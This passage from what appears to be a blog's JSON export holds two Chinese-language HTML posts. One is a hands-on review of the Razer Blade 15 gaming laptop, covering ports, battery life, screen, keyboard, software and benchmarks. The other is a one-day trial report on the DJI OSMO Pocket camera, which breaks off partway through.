面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 